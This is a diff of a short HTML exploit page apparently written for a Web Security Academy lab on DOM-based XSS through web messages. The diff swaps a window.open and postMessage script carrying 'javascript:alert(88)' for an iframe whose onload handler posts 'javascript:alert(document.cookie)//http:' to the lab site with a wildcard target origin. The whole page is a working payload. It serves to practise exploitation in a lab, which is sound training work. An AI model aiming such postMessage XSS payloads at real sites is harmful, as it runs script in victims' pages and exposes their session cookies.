@@ -5,16 +5,9 @@
    <title> postMessage </title>
 </head>
 
-<script>
-
-var send = window.open("https://ac271fef1f79f7ae80b37be7004800e7.web-security-academy.net");
-
-setInterval(function(){ send.postMessage('javascript:alert(88)//http:','*'); }, 3000);
-
-</script>
 
 <body>
-<h1>test postMessage </h1>
+<iframe src="https://ac271fef1f79f7ae80b37be7004800e7.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">
 </body>
 </html>
 
